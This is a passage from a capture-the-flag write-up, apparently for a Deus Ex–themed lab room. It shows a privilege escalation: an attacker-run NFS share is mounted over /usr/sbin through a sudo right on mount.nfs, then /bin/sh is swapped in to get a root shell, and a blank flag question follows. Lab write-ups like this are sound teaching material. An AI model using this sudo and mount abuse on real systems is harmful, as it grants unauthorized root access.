```bash
[nfsd]
port=443
```

<br>
<p>Add the share created to /etc/exports</p>

```bash
:~/DX2HellsKitchen# sudo bash -c 'echo "/tmp/share 10.0.0.0/8(rw)" >> /etc/exports'
```

```bash
:~/DX2HellsKitchen# sudo exportfs -a
```

```bash
:~/DX2HellsKitchen# sudo systemctl restart nfs-kernel-server
```

<br>
<br>

```bash
jojo@tonhotel:~$ sudo /usr/sbin/mount.nfs -o port=443 xxx.xxx.xxx.xx:/tmp/share /usr/sbin
[sudo] password for jojo:
```

```bash
jojo@tonhotel:~$ cp /bin/sh /usr/sbin/mount.nfs
```

```bash
jojo@tonhotel:~$ ls -la /usr/sbin
```

<h1 align="center">Shell as root</h1

```bash
jojo@tonhotel:~$ sudo /usr/sbin/mount.nfs
# 
```

```bash

```

```

```
<br>
<p>1.3. <em>What is the Root flag?</em> Hint: ...if you can get out, what can you use?<br>
<code>_________________________________________</code></p>

<br>
<h2>Task 2 . Credits</h2>
<p>As with DX1: Liberty Island, thanks to https://nuwen.net/dx.html, a compiled Deus Ex text resource by the excellent Stephan T. Lavavej. I also used DX: Revision to get some screenshots of email UI, so thanks to the authors of that mod. And thanks to all of you!</p>

<p><em>Answer the question below</em></p>

<p>2.1. <em>Thanks!<br>
<code>No answer needed</code></p
